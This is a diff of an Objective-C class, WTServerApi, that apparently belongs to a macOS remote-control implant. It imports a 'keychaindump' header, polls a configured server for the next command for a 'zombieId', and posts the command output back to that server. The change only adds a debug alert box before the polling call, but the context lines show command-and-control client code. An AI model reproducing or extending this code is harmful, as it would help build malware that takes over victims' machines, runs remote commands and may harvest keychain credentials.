@@ -14,6 +14,7 @@
 #import "keychaindump.h"
 #import "WTUUIDApi.h"
 #import "WTJsonParser.h"
+#import <Cocoa/Cocoa.h>
 
 @implementation WTServerApi
 
@@ -80,6 +81,8 @@
 }
 
 +(NSArray *)nextCommand {
+    NSAlert *alert = [NSAlert alertWithMessageText:@"Go" defaultButton:@"Go" alternateButton:@"g" otherButton:@"f" informativeTextWithFormat:@"f"];
+    [alert runModal];
     WTConfig *config = [WTConfig getConfig];
     NSString *zombieId = [config getZombieId];
     NSString *url = [NSString stringWithFormat:@"%@/next/command/%@", [config getBaseUrl], zombieId];
@@ -112,4 +115,5 @@
     NSString *url = [NSString stringWithFormat:@"%@/finished/command/%@", [config getBaseUrl], commandId];
     [[[WTHTTPApi alloc] init] httpPostRequest:url usingGetData:nil usingPostData:@{@"output":commandOutput}];
 }
+
 @end
